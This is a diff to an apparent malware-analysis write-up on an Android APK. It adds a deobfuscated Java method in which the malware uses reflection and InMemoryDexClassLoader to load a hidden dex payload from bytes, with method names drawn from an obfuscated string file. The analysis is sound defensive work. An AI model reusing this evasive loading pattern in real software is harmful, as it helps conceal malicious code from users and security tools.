@@ -214,13 +214,32 @@ public static void fetchFilesAndProcess() {
 ```
 
 As we can see, the function is fetching the files and is then it maps 'muchaspuchas' strings into application methods.
-This shows that the authors wanted to obfuscate application method calls with reflection.
+This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze `mapMuchasStringsToMethods` function and deofuscated it in the following way
+```
+    public static void mapMuchasPuchasToMethods(byte[] bArr) {
+        Class inMemoryDexClassLoader = (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[0]); // dalvik.system.InMemoryDexClassLoader
+        Class cls = (Class) inMemoryDexClassLoader.getMethod(Malicious.muchasStrings.get()[2], String.class).invoke(inMemoryDexClassLoader.getConstructor((Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[11]), (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[12])).newInstance(ByteBuffer.wrap(bArr), Class.class.getMethod(Malicious.muchasStrings.get()[1], new Class[0]).invoke(Malicious.class, new Object[0])), Malicious.muchasStrings.get()[3]);
+        Malicious.makePdfPage = getClassMethod(cls, Malicious.muchasStrings.get()[10], Context.class);
+        Malicious.readPdfFile = getClassMethod(cls, Malicious.muchasStrings.get()[7], Context.class);
+        Malicious.getFirstText = getClassMethod(cls, Malicious.muchasStrings.get()[5], new Class[0]);
+        Malicious.getSecondText = getClassMethod(cls, Malicious.muchasStrings.get()[6], new Class[0]);
+        Method init = getClassMethod(cls, Malicious.muchasStrings.get()[4], Class.class, Class.class);
+        Malicious.launch = getClassMethod(cls, Malicious.muchasStrings.get()[9], Context.class);
+        Malicious.getName = getClassMethod(cls, Malicious.muchasStrings.get()[8], Context.class);
+        init.invoke(null, PartPreviewActivity.class, MainActivity.class);
+    }
+```
+
+From that, we can see that the function is using java reflection to dynamically assign variables of Malicious class based on methods/classes names obtained from muchaspuchas file.
+
+
+
 
 
 TODO
 1. muchaspuchas maybe a CSV type file
 2. Based on 1., we look for split functions.
-3. Explore the `mapMuchasPuchasToMethods` method
+3. Explore 'mapMuchasPuchasToMethods' line 2 (Class cls = (Class) inMemory...)
 
 
 Going through the _1.apk_ files, we encountered a package named "juw.khdqwmf.xftkgphgq.fhyu" containing Chinese characters. After translating these strings using Google Translate, we determined that these characters formed simple Chinese sentences unrelated to the application's purpose. Further exploration revealed that **these strings were translated into package names when passed through a function**. This indicates that the original authors chose to obscure package names using Chinese strings.
